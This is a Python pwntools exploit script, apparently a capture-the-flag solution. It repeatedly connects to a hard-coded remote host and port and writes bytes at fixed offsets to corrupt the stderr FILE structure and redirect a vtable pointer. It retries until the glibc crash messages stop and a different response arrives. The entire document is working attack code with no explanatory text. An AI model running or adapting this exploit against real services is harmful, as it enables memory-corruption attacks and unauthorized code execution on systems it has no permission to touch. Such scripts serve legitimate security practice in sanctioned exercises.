from pwn import *


STDERR_OFF = 0x2e7430
VTABLE_OFF = 0x2e82f0


FAILS = [
    b'*** stack smashing detected ***: terminated\n',
    b'mremap_chunk(): invalid pointer\n',
    b'free(): invalid pointer\n',
    b'double free or corruption (out)\n'
]


HOST = '65.108.176.61'


if __name__ == '__main__':
    for attempt in range(1_000_000):
        print(f'Attempt #{attempt}')
        with (
            process('./vuln_patched') if args.LOCAL else remote(HOST, 55557)
        ) as tube:
            if not args.LOCAL:
                tube.readline()

            def set_byte(off, b):
                tube.sendline(f'{hex(off)} {hex(b)}'.encode())

            payload_nums = [0x123456]

            payload = [
                (STDERR_OFF,        ord('/')),
                (STDERR_OFF + 1,    ord('r')),
                (STDERR_OFF + 2,    ord('e')),
                (STDERR_OFF + 3,    ord('*')),
                (STDERR_OFF + 4,    0),
                (STDERR_OFF + 0x28, 1),
                (VTABLE_OFF + 0x18, 0xe0),
                (VTABLE_OFF + 0x19, 0xcd),
                (VTABLE_OFF + 0x1a, 0xcc),
            ]

            payload_nums.append(len(payload))
            for off, b in payload:
                payload_nums.extend([off, b])

            raw_payload = ' '.join(map(hex, payload_nums)).encode()
            tube.sendline(raw_payload)

            try:
                resp = tube.recvline(timeout=5.0)
                if resp in FAILS or not resp:
                    continue
                print(resp)
                break
            except EOFError:
                print('FAIL')
                continue
